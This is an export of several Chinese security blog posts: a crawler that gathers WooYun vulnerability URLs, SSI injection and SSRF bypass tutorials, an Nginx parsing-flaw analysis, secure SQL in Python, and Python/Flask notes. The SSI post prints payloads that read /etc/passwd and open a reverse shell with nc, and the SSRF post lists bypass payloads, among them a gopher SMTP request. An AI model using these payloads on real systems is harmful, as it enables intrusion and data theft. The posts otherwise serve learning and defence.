    <title><![CDATA[Wooyun漏洞地址url爬虫及数据处理]]></title>
    <url>%2F2018%2F03%2F28%2FWooyun%E6%BC%8F%E6%B4%9E%E5%9C%B0%E5%9D%80url%E7%88%AC%E8%99%AB%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%2F</url>
    <content type="text"><![CDATA[之前做测试的时候，发现@四爷发现个漏洞，一个非常古怪的地址，我问四爷：“你咋知道这个的？”，四爷说：“扫的啊！”，我：“。。。”，所以才有了这篇文章。 PS：以上故事纯属扯淡 ! 0.0 其实是今年给自己定了个目标，就是好好把编程给学好，毕竟自己安全那么菜，说不定就失业了。。。 0x00 获取Wooyun漏洞地址这里选择爬取的目标是https://wooyun.shuimugan.com，这个镜像站有个好处，就是它的wooyun漏洞地址存入数据库的时候使用了id，即https://wooyun.shuimugan.com/bug/view?bug_no=1这种形式，所以，我们只需要遍历bug_no即可获取所有的漏洞地址（这里考虑到数据下载、处理、文件io等因素，选择了先把存在漏洞的url先存起来）。 感谢网站的站长的不杀之恩！因为，在进行获取地址的时候由于一直再调试并发引擎，所以爬了好多遍。。。 在获取存在漏洞URL的时候只使用了协程，然后主程序使用的进程，数据下载部分使用的进程+协程。 在使用requests请求的时候虽然一直用verif=False来忽略ssl，但是会一直打印： 12/Library/Python/2.7/site-packages/requests/packages/urllib3/connectionpool.py:768: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.org/en/latest/security.htmlInsecureRequestWarning) 搞的很不爽，百度了下使用了下面代码解决： 1234567import ssltry: _create_unverified_https_context = ssl._create_unverified_context # 忽略证书错误except AttributeError: passelse: ssl._create_default_https_context = _create_unverified_https_context 请求的时候使用了通用的反爬虫策略： 伪装header头 随机User-Aagent 随机IP 这里本来是打算使用自己的代理池的，无奈免费的代理实在是慢，浪费时间，同时可能导致数据不准确。所以就没有使用代理IP了。 1234567headers = &#123;"User-Agent": random.choice(User-Agent),"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3","Upgrade-Insecure-Requests": "1","Content-Type": "application/x-www-form-urlencoded"&#125; 协程部分： 12345678910from gevent import monkey, poolmonkey.patch_all()reload(sys)sys.setdefaultencoding('utf8')p = pool.Pool(150)for i in range(NUM): _url = url + str(i) jobs.append(p.spawn(getURL, _url))gevent.joinall(jobs) 网站bug_no总共有230305个，获取到了8万多个存在漏洞的地址。 0x01 下载数据下载数据是爬虫的重点，本着只多不少的原则，本来考虑到大的数据量，效率问题，使用正则表达式来进行处理，但是发现获取的脏数据太多，对后面的数据处理造成了很多无法预知的麻烦，所以最终选择的方案是使用xpath+re来进行数据处理。 首先，使用xpath获取漏洞细节部分（有些url在poc字段，但是考虑到大部分，所以只选择了漏洞细节字段，所以爬取的结果不是很准确。） xpath：//*[@id=&quot;w0&quot;]/tbody/tr[21]/td/text() 这里遇到个问题就是无论怎么复制，都无法获取到漏洞细节里面的内容，使用chrome的xpath helper也的确是能匹配到内容，实在是郁闷！最终在我@加菲猫和@nearg1e斌哥哥的帮助下找到了原因。 原因在于：chrome浏览器在进行页面渲染时使用了htmlparse进行了处理，所以诸如tbody等一些标签是chrome自动加载的。 最终的xpath：//*[@id=&quot;w0&quot;]/tr[21]/td//text() 下面就是从漏洞细节中获取所有的URL了，这里还是为了更多的获取URL，找了个非常全面的正则表达式： 1r = re.compile(r'(?i)\b((?:[a-z][\w-]+:(?:/&#123;1,3&#125;|[a-z0-9%])|www\d&#123;0,3&#125;[.]|[a-z0-9.\-]+[.][a-z]&#123;2,4&#125;/)(?:[^\s()&lt;&gt;]+|\(([^\s()&lt;&gt;]+|(\([^\s()&lt;&gt;]+\)))*\))+(?:\(([^\s()&lt;&gt;]+|(\([^\s()&lt;&gt;]+\)))*\)|[^\s\`!()\[\]&#123;&#125;;:\'".,&lt;&gt;?«»“”‘’]))') 导致匹配的URL什么奇葩都有，具体可看：dicc.txt的内容 在使用这个re的时候又遇到个问题，程序跑着跑着停了，很是无语，后来经帮助调试发现是有些sql注入的URL中存在(,)这两个字符，导致正则死掉，为了图方便，直接做了个判断给剔除了 -。- 并发部分参考如下代码：123456789101112131415161718192021222324252627...def create_process(level, jobqueue, plugins, debug, headers): for _ in range(level): process = multiprocessing.Process(target=worker, args=(jobqueue, plugins, debug, headers)) process.daemon = True process.start()def worker(jobqueue, plugins, debug, headers): while True: try: target = jobqueue.get() gevent_scan_task(target, plugins, debug, headers) except Exception, e: print traceback.format_exc() finally: jobqueue.task_done()def gevent_scan_task(target, plugins, debug, headers): evt = Event() pool = [] scanmodle = ScanModle(target, plugins, debug, headers) pool.append(gevent.spawn(scanmodle.scan_port(evt))) pool.append(gevent.spawn(scanmodle.scan_plugins(evt))) for port in scanmodle.get_ports(): pool.append(gevent.spawn(scanmodle.scan_plugins(evt, port))) gevent.joinall(pool) save_cache(scanmodle) 最终获取到了153217个地址 0x02 数据处理这部分说难也难说不难也不难，我是不太在行【捂脸】，目前我处理的步骤如下： 去除所有中文部分（这里由于有些url中的确是带中文，所有使用换行替换） 去除所有只有/，.及len(strip(link) == 0的部分 获取所有URL中的目录部分(使用urlparse) 去除一些其他比如wooyun/bugs，jdbc，**，xmlns，t.cn，ldap，ssh等非预期字符及长度小于等于4的部分 使用urlparse获取p.path, p.query,p.fragment,并使用isinstance来判断两个URL是否相同来去重 说明： 1、第三步没有使用迭代，比如： 12345678/wooyun/bugs/?id=1没有获取：?id=1/wooyun/wooyun/bugs/只是获取到：/wooyun/bugs/?id=1有兴趣可参考：https://github.com/Xyntax/POC-T/blob/2.0/plugin/urlparser.py 代码如下： 123456789101112131415import urlparseimport sysreload(sys)sys.setdefaultencoding('utf-8')def iterate_path(ori_str):# parser = urlparse.urlparse(ori_str)# _path_list = parser.path.replace('//', '/').strip('/').split('/')# print _path_list _ans_list = set() _ans_list.add(ori_str) _ans_list = list(_ans_list) for i in range(len(_ans_list)): p = urlparse.urlparse(_ans_list[i]) return urlparse.urlunsplit(['', '', p.path, p.query, p.fragment]) 2、第五步是简单去除如下类型的URL： 1234567/wooyun/?id=1&amp;url=123/wooyun/?id=2&amp;url=233/wooyun/?id=3&amp;url=666和/wooyun/1.html/wooyun/233.html/wooyun/6666.html 0x03 后续其实我主要是想获取个扫描目录的字典，但是如果发散下呢？这些URL有什么用？ 我思考的如下： 1、在我刚算入门安全的时候wooyun叽叽了，所以有些漏洞自己基本上没见过，要是在一个一个去看文章，那代价太大了也没有时间。使用这个做目录扫描的时候，如果发现存在此URL，那么说明在wooyun上是存在这个漏洞的，如果自己不知道就可以搜一波，学习下了，快捷、高效。 2、做agent、入侵防御、态势感知的话，可把这些做成漏洞库，遇到访问这些地址就可以来个告警，也可以当个威胁情报搞搞。 3、做个漏洞分析，看看大佬们都喜欢提交啥漏洞（我不会告诉你排在第一二的是svn和git） 获取的数据，处理和没处理的都可以在下面地址下载（PS：处理真的只是简单处理，比如大佬们上传的webshell、一些只针对某个网站的URL筛选等都得做，，，慎用！后续还得优化，大佬们有兴趣的话带带我。 0.0） 未处理：dicc.txt 已处理：dicc8.txt]]></content>
      <tags>
        <tag>爬虫</tag>
        <tag>Python</tag>
        <tag>自动化</tag>
        <tag>漏洞挖掘</tag>
        <tag>Wooyun</tag>
        <tag>字典</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSI-服务器端包含注入]]></title>
    <url>%2F2018%2F01%2F05%2FSSI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[前段时间刚好在一篇文章中看到了一个SSI的文章，现在这种业务基本上很少见了，之前也没了解过(原谅我是菜鸡—_-!)没留意过。运气好，刚好在微博上给遇到了，所以记录下学习过程。 0x01 关于SSISSI是英文”Server Side Includes”的缩写，翻译成中文就是服务器端包含的意思。SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。 从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。 1.1 启用SSI示例：Nginx 配置SSI功能 在http段中加入下面几句即可：123ssi on;ssi_silent_errors off;ssi_types text/shtml; 默认Apache不开启SSI，SSI这种技术已经比较少用了。如果应用没有使用到SSI，关闭服务器对SSI的支持即可。 IIS和Apache都可以开启SSI功能，具体可参考:http://m.jb51.net/article/25725.htm 1.2 SSI语法首先，介绍下SHTML，在SHTML文件中使用SSI指令引用其他的html文件（#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。比如说框架是固定的，但是里面的文章，其他菜单等即可以用#include引用进来。1234567891011121314151617181920212223242526272829303132333435361、显示服务器端环境变量&lt;#echo&gt;本文档名称：&lt;!–#echo var="DOCUMENT_NAME"–&gt;现在时间：&lt;!–#echo var="DATE_LOCAL"–&gt;显示IP地址&lt;/ins&gt;&lt;! #echo var="REMOTE_ADDR"–&gt;2、将文本内容直接插入到文档中&lt;#include&gt;&lt;! #include file="文件名称"–&gt;&lt;!--#include virtual="index.html" --&gt;&lt;! #include virtual="文件名称"–&gt;&lt;!--#include virtual="/www/footer.html" --&gt;注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径3、显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)文件最近更新日期：&lt;! #flastmod file="文件名称"–&gt;文件的长度：&lt;!–#fsize file="文件名称"–&gt;4、直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)&lt;!–#exec cmd="文件名称"–&gt;&lt;!--#exec cmd="cat /etc/passwd"--&gt;&lt;!–#exec cgi="文件名称"–&gt;&lt;!--#exec cgi="/cgi-bin/access_log.cgi将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是cgi。5、设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式)6、高级SSI可设置变量使用if条件语句。 更多请参考：http://www.javaeye.com/topic/306216 0x02 漏洞场景在很多业务中，用户输入的内容会显示在页面中。比如，一个存在反射型XSS漏洞的页面，如果输入的payload不是XSS代码而是SSI的标签，同时服务器又开启了对SSI的支持的话就会存在SSI漏洞。 从定义中看出，页面中有一小部分是动态输出的时候使用SSI，比如：1234文件相关的属性字段当前时间访客IP调用CGI程序 0x03 SSI注入的条件当符合下列条件时，攻击者可以在 Web 服务器上运行任意命令： Web 服务器已支持SSI（服务器端包含） Web 应用程序未对对相关SSI关键字做过滤 Web 应用程序在返回响应的HTML页面时，嵌入用户输入 SSI注入常用命令： https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection 0x04 SSI挖掘思路两个思路： 从业务场景来Fuzz，比如获取IP、定位、时间等 识别页面是否包含.stm,.shtm和.shtml后缀 google dork：inurl:bin/cklb 0x05 SSI漏洞复现5.1 本地测试我们使用bWAPP来做漏洞演示环境选择：Server-Side Includes (SSI) Injection输入个XSS的payload：&lt;script&gt;alert(1)&lt;/script&gt;成功执行了代码。 再使用下exec指令使用cmd作为参数执行服务器端命令：&lt;!--#exec cmd=&quot;ls -al&quot;--&gt; 5.2 漏洞挖掘运气好，刚好遇到个微博的。1"--&gt;'--&gt;`--&gt;&lt;&lt;!--#exec cmd="cat /etc/passwd"--&gt; 1"--&gt;'--&gt;`--&gt;&lt;&lt;!--#exec cmd="nc x.x.x.x 9090 -e /bin/bash"--&gt; 0x06 SSI防御 关闭服务器SSI功能 过滤相关SSI特殊字符（&lt;,&gt;,#,-,&quot;,&#39;） 具体请参考：SSI 注入的介绍和代码防御 参考：http://m.jb51.net/article/25725.htm http://www.kubiji.cn/topic-id998.html https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection http://www.mottoin.com/101526.html http://www.evilclay.com/2017/04/28/SSI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/ http://blog.csdn.net/qq_29277155/article/details/52751364]]></content>
      <tags>
        <tag>自动化</tag>
        <tag>命令执行</tag>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF绕过方法总结]]></title>
    <url>%2F2017%2F11%2F21%2FSSRF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[前言 昨天忘了在公众号还是微博上看到的了，看到一个SSRF绕过的技巧，使用的是ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ绕过的，自己也没遇到过。然后想想自己对SSRF绕过还是停留在之前的了解，也没学习过新的绕过方法，所以特意找了找资料，学习学习最新黑科技，充充能。 0x00 SSRF是什么能精简的就不扯淡，一句话就是：利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。 0x01 SSRF能干什么 探测内网信息 攻击内网或本地其他服务 穿透防火墙 。。。 0x02 SSRF怎么找 能够对外发起网络请求的地方 请求远程服务器资源的地方 数据库内置功能 邮件系统 文件处理 在线处理工具 。。。 举几个例子： 在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。 根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。 数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。 邮件系统就是接收邮件服务器地址这些地方。 文件就找ImageMagick，xml这些。 从URL关键字中寻找，比如：source,share,link,src,imageurl,target等。 以上这些不是本文的重点，下面说下重点介绍的SSRF绕过的方法。 0x03 SSRF怎么绕1、攻击本地12http://127.0.0.1:80http://localhost:22 2、利用[::]123利用[::]绕过localhosthttp://[::]:80/ &gt;&gt;&gt; http://127.0.0.1也有看到利用http://0000::1:80/的，但是我测试未成功 3、利用@1http://example.com@127.0.0.1 4、利用短地址1http://dwz.cn/11SMa &gt;&gt;&gt; http://127.0.0.1 5、利用特殊域名利用的原理是DNS解析1http://127.0.0.1.xip.io/ 1http://www.owasp.org.127.0.0.1.xip.io/ 6、利用DNS解析1在域名上设置A记录，指向127.0.1 7、利用上传1234也不一定是上传，我也说不清，自己体会 -.-修改"type=file"为"type=url"比如：上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF 8、利用Enclosed alphanumerics1234利用Enclosed alphanumericsⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.comList:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号1127。0。0。1 &gt;&gt;&gt; 127.0.0.1 10、利用进制转换12345可以是十六进制，八进制等。115.239.210.26 &gt;&gt;&gt; 16373751032首先把这四段数字给分别转成16进制，结果：73 ef d2 1a然后把 73efd21a 这十六进制一起转换成8进制记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x 1http://127.0.0.1 &gt;&gt;&gt; http://0177.0.0.1/ 1http://127.0.0.1 &gt;&gt;&gt; http://2130706433/ 12http://192.168.0.1 &gt;&gt;&gt; http://3232235521/http://192.168.1.1 &gt;&gt;&gt; http://3232235777/ 11、利用特殊地址1http://0/ 12、利用协议1234567891011Dict://dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;ssrf.php?url=dict://attacker:11111/SFTP://ssrf.php?url=sftp://example.com:11111/TFTP://ssrf.php?url=tftp://example.com:12346/TESTUDPPACKETLDAP://ssrf.php?url=ldap://localhost:11211/%0astats%0aquitGopher://ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过的组合即可 参考链接：https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRFhttps://twitter.com/albinowax/status/890725759861403648http://blog.safebuff.com/2016/07/03/SSRF-Tips/https://hackerone.com/reports/115748https://www.dailysecurity.fr/server-side-request-forgery/https://twitter.com/EdOverflowhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injectionhttp://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdfhttp://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/http://blog.csdn.net/xinianbuxiu/article/details/53560417]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>CTF</tag>
        <tag>WAF绕过</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx解析漏洞原理分析]]></title>
    <url>%2F2017%2F11%2F09%2FNginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x01 漏洞描述漏洞介绍：nginx是一款高性能的web服务器，使用非常广泛，其不仅经常被用作反向代理，也可以非常好的支持PHP的运行。Nginx&lt;8.03默认情况下可能导致服务器错误的将任何类型的文件以PHP的方式进行解析，这将导致严重的安全问题，使得恶意的攻击者可能攻陷支持php的nginx服务器。 0x02 概念介绍0x21 CGICGI是规定web server传递过来的数据是何种标准格式，简单说就是一个协议。web server(例如nginx)只是内容的分发者。比如： 1234567891) 如果请求/index.html，那么web server会去文件系统中找到这个文件，发送给浏览器，这里分发的是静态数据2) 如果请求的是/index.php，根据配置文件，nginx知道这个不是静态文件，需要去找PHP解析器来处理，那么他会把这个请求简单处理后交给PHP解析器问题的核心在于Nginx需要传哪些数据给PHP解析器呢，例如：1) url2) 查询字符串3) POST数据4) HTTP header... 所以，CGI本质上就是规定要传哪些数据、以什么样的格式传递给后方处理这个请求的协议。 0x22 FastCGIFastCGI顾名思义也是CGI的一个协议，FastCGI只是优化了CGI程序的性能12341) 首先，Fastcgi会先启一个master，解析配置文件，初始化执行环境2) 然后再启动多个worker3) 当请求过来时，master会传递给一个worker，然后立即可以接受下一个请求。这样就避免了重复的劳动，效率提高了4) 而且当worker不够用时，master可以根据配置预先启动几个worker等着，同时如果发现空闲worker太多时，也会停掉一些，这样就提高了性能，也节约了资源 0x23 PHP-CGI/PHP-FastCGIPHP的解释器是PHP-CGI，PHP-CGI只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理 0x24 PHP-FPMPHP-FPM是PHP-CGI进程的管理器，用来管理PHP-CGI进程的，PHP-FPM的管理对象是PHP-CGI 0x03 漏洞分析nginx默认以cgi的方式支持php的运行，在配置文件中如下配置: 12345678location ~ .php$ &#123; root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; include fastcgi_params;&#125; 配置参数说明如下 1234567891011121314151. location对请求进行选择的时候会使用URI环境变量进行选择 1) 其中传递到后端Fastcgi的关键变量SCRIPT_FILENAME由nginx生成的$fastcgi_script_name决定 2) 而通过分析可以看到$fastcgi_script_name是直接由URI环境变量控制的2. 这里就是产生问题的点。而为了较好的支持PATH_INFO的提取，在PHP的配置选项里存在cgi.fix_pathinfo选项，其目的是为了从SCRIPT_FILENAME里取出真正的脚本名 我们来假设一个攻击场景: 1. 假设存在一个URL: http://localhost/test/test.jpg 2. 我们以如下的方式去访问: http://localhost/test/test.jpg/test.php 3. nginx将会得到一个URI: /test.jpg/test.php 4. 经过location指令，该请求将会交给后端的fastcgi处理，nginx为其设置环境变量SCRIPT_FILENAME，内容为: /scripts/test.jpg/test.php 5. 后端的fastcgi在接受到该选项时，会根据fix_pathinfo配置决定是否对SCRIPT_FILENAME进行额外的处理，一般情况下如果不对fix_pathinfo进行设置将影响使用PATH_INFO进行路由选择的应用，所以该选项一般配置开启。php通过该选项之后将查找其中真正的脚本文件名字，查找的方式也是查看文件是否存在，这个时候将分离出SCRIPT_FILENAME和PATH_INFO分别为 1) SCRIPT_FILENAME: /scripts/test.jpg 2) PATH_INFO: test.php 6. 最后，以/scripts/test.jpg作为此次请求需要执行的脚本，而nginx会使用php解析器来处理这个jpg文件，攻击者就可以实现让nginx以php来解析任何类型的文件了 所以，漏洞的本质实际上就是由于fcgi和web server对script路径级参数的理解不同出现的问题，这是典型的因为跨系统语境不同导致对同一个请求的不同解释导致的漏洞，它的攻击面是带有这种漏洞的nginx 0x04: 修复方案 修改php.ini配置 1cgi.fix_pathinfo = 0 nginx配置文件中添加1234567891011if ( $fastcgi_script_name ~ ..*/.*php ) &#123; return 403;&#125;/*考虑到MVC框架、用户自定义站点中有可能出现xxx/xx.php的情况，这个规则应该更加细粒度一点，例如*.jpg/.*php、*.txt/.*php*/另外，nginx可以在不需要重启的情况，hotreload配置文件service nginx reload //or /etc/init.d/nginx reload 参考文章： http://www.80sec.com/nginx-securit.htmlhttp://php.net/manual/zh/ini.core.phphttp://www.cnblogs.com/LittleHann/p/4561462.htmlhttp://php.net/manual/zh/install.fpm.configuration.phphttp://php.net/manual/zh/install.fpm.phphttp://segmentfault.com/q/1010000000256516]]></content>
      <tags>
        <tag>文件上传</tag>
        <tag>解析漏洞</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python安全开发之SQL注入]]></title>
    <url>%2F2017%2F11%2F05%2FPython%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[PHP中使用的预编译在python中同样适用，同样可以用预编译来防止python编码中的SQL注入问题。 错误用法：12sql = "select id,name from user where id = %s and name = %s" % (id, name)cur.execute(sql) 这种用法就是常见的拼接字符串导致sql注入漏洞的产生。 正确用法： 12args = (id, name)cur.execute('select id,name from user where id = %s and name = %s', args ) 使用如此参数带入方式，python会自动过滤args中的特殊字符，制止SQL注入的产生。 execute()函数本身就有接受SQL语句变量的参数位，可以通过python自身的函数处理sql注入问题,只要正确的使用（即：使用”逗号”，而不是”百分号”）就可以对传入的值进行正确的转义，从而避免SQL注入的发生。 For Example: 12345678910111213141516import sqlite3con = sqlite3.connect(":memory:")cur = con.cursor()cur.execute("create table people (name, age)") who = "test"age = 22 # This is the qmark style:cur.execute("insert into people values (?, ?)", (who, age)) # And this is the named style:cur.execute("select * from people where name_last=:who and age=:age", &#123;"who": who, "age": age&#125;) print cur.fetchone() 参考文章：http://xlixli.net/?p=377http://www.cnblogs.com/sevck/p/6733702.htmlhttps://crazyof.me/blog/archives/2224.html]]></content>
      <tags>
        <tag>编程</tag>
        <tag>Python</tag>
        <tag>SQL注入</tag>
        <tag>安全开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python开发笔记]]></title>
    <url>%2F2017%2F10%2F17%2FPython%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[近期学习开发中遇到的一些知识，做的学习笔记，做个小记录，持续更新中… Dataset基于SQLAlchemy的便利工具官方文档 数据集使得数据库中的数据读取和写入数据就像阅读和编写JSON文件一样简单。 dataset对于操作JSON、CSV文件、NoSQL非常好用。 import dataset 连接MySQL数据库： 123456db = dataset.connect('mysql://username:password@10.10.10.10/ctf?charset=utf8')用户名:username，密码:password，数据库地址(地址+端口):10.10.10.10，database名: ctf连接SQLite数据库：db = dataset.connect('sqlite:///ctf.db')连接PostgreSQL数据库：db = dataset.connect('postgresql://scott:tiger@localhost:5432/mydatabase') 一定要注意指定字符编码 12345678table = db['city'] #（选择city表）user = table('name') # 找出表中'name'列属性所有数据res = db.query('select name from table limit 10') # 如果不需要查看全部数据的话最好用limit，因为全部数据的载入非常非常耗时间for x in res: print x['name'] # 选name字段的数据table.insert(dict(name='John Doe', age=37))table.insert(dict(name='Jane Doe', age=34, gender='female'))john = table.find_one(name='John Doe') 在数据库中查找是否有同时满足多个条件的数据：table.find_one(属性1=属性值1, 属性2=属性值2, ...) 注：find_one速度很慢 插入数据dataset会根据输入自动创建表和字段名 12345table = db['user']# 或者table = db.get_table('user')table.insert(dict(name='John Doe', age=46, country='China'))table.insert(dict(name='Jane Doe', age=37, country='France', gender='female'))# 主键id自动生成 更新数据12table.update(dict(name='John Doe', age=47), ['name'])# 第二个参数相当于sql update语句中的where，用来过滤出需要更新的记录 事务操作事务操作可以简单的使用上下文管理器来实现,出现异常，将会回滚 12345678910111213141516with dataset.connect() as tx: tx['user'].insert(dict(name='John Doe', age=46, country='China'))# 相当于：db = dataset.connect()db.begin()try: db['user'].insert(dict(name='John Doe', age=46, country='China')) db.commit()except: db.rollback()# 也可以嵌套使用:db = dataset.connect()with db as tx1: tx1['user'].insert(dict(name='John Doe', age=46, country='China')) with db as tx2: tx2['user'].insert(dict(name='Jane Doe', age=37, country='France', gender='female')) 从表获取数据12345users = db['user'].all()for user in db['user']: # print(user['age']) # chinese_users = user.find(country='China') john = user.find_one(name='John Doe') 获取非重复数据 db[&#39;user&#39;].distinct(&#39;country&#39;) 删除记录1table.delete(place='Berlin') 执行SQL语句123result = db.query('SELECT country, COUNT(*) c FROM user GROUP BY country')for row in result: print(row['country'], row['c']) 导出数据12result = db['users'].all()dataset.freeze(result, format='json', filename='users.json') JSONJSON(JavaScript Object Notation) 是一种轻量级的数据交换格式，非常易于人阅读和编写。 123import jsonjson.dumps 将 Python 对象编码成 JSON 字符串json.loads 将已编码的 JSON 字符串解码为 Python 对象 MySQL数据库：分类表-categories，包括类别web,reversing，crypto(加解密),mic等 题目表-tasks,包括题目id，题目名，flag,分值，文件&amp;地址，题目等级，题目详细描述 flag表-flag,包括题目id,用户id,得分，时间戳 用户表-users，包括用户id,用户名，密码 题目分类表-cat_task,包括题目id,题目类别id flag表中每条数据由于是有题目ID task_id和用户ID user_id来共同确认的，所以采用复合主键：primary key (task_id,user_id) 联合主键和复合主键的区别 python装饰器Decorator通过返回包装对象实现间接调用,以此插入额外逻辑 https://www.zhihu.com/question/26930016 wraps本身也是一个装饰器，它能把原函数的元信息拷贝到装饰器函数中，这使得装饰器函数也有和原函数一样的元信息了 123456789101112131415from functools import wrapsdef logged(func): @wraps(func) def with_logging(*args,**kwargs): print func.__name__ + "was called" return func(*args,**kwargs) return with_logging@loggeddef f(x): """does some math""" return x + x * xprint f.__name__ # prints 'f'print f.__doc__ # prints 'does some math' web框架采用flaskfrom flask import Flask 引入Flask类，Flask类实现了一个WSGI(Web Server Gateway Interface)应用 app = Flask(__name__) app是Flask的实例，它接收包或者模块的名字作为参数，但一般都是传递__name__ 123@app.route('/')def hello_world(): return 'Hello World!' 使用app.route装饰器会将URL和执行的视图函数的关系保存到app.url_map属性上。处理URL和视图函数的关系的程序就是路由，这里的视图函数就是hello_world 12if __name__ == '__main__': app.run(host='0.0.0.0',port=9000) 使用这个判断可以保证当其他文件引用这个文件的时候（例如from hello import app）不会执行这个判断内的代码，也就是不会执行app.run函数。 执行app.run就可以启动服务了。默认Flask只监听虚拟机的本地127.0.0.1这个地址，端口为5000。而我们对虚拟机做的端口转发端口是9000，所以需要制定host和port参数，0.0.0.0表示监听所有地址，这样就可以在本机访问了。 服务器启动后，会调用werkzeug.serving.run_simple进入轮询，默认使用单进程单线程的werkzeug.serving.BaseWSGIServer处理请求，实际上还是使用标准库BaseHTTPServer.HTTPServer，通过select.select做0.5秒的while TRUE的事件轮询。当我们访问http://127.0.0.1:9000/,通过app.url_map找到注册的/这个URL模式,就找到了对应的hello_world函数执行，返回hello world!,状态码为200。如果访问一个不存在的路径，如访问http://127.0.0.1:9000/a,Flask找不到对应的模式，就会向浏览器返回Not Found，状态码为404 